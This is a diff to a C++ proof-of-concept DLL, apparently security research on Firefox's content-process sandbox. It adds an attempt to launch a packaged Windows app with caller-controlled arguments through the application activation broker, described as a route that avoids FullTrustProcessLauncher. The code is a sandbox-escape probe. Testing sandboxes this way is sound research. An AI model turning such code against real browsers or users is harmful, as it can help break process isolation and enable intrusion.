@@ -2,6 +2,7 @@
 
 #include <appmodel.h>
 #include <roapi.h>
+#include <shobjidl.h>
 #include <winrt/Windows.ApplicationModel.h>
 #include <winrt/Windows.ApplicationModel.Background.h>
 #include <winrt/Windows.Foundation.h>
@@ -88,6 +89,8 @@ extern "C" __declspec(dllexport) DWORD WINAPI RunPoc(void* raw_context) {
   context->call_hresult = E_PENDING;
   context->extended_error = S_OK;
   context->launch_result = -1;
+  context->activation_hresult = E_PENDING;
+  context->activation_pid = 0;
   context->background_register_hresult = E_PENDING;
   context->background_registered = FALSE;
   CaptureCurrentProcess(context->caller);
@@ -113,6 +116,23 @@ extern "C" __declspec(dllexport) DWORD WINAPI RunPoc(void* raw_context) {
     context->call_hresult = error.code().value;
   } catch (...) {
     context->call_hresult = E_FAIL;
+  }
+
+  // Exercise the packaged-app activation broker from the same renderer token.
+  // This OS path is independent of FullTrustProcessLauncher and accepts an
+  // AUMID plus a caller-controlled argument string.
+  if (context->application_user_model_id[0] != L'\0') {
+    IApplicationActivationManager* manager = nullptr;
+    HRESULT result = CoCreateInstance(
+        CLSID_ApplicationActivationManager, nullptr, CLSCTX_INPROC_SERVER,
+        IID_PPV_ARGS(&manager));
+    if (SUCCEEDED(result)) {
+      result = manager->ActivateApplication(
+          context->application_user_model_id, context->launch_arguments,
+          AO_NONE, &context->activation_pid);
+      manager->Release();
+    }
+    context->activation_hresult = result;
   }
 
   // The direct launch is expected to be denied for a Firefox content token.
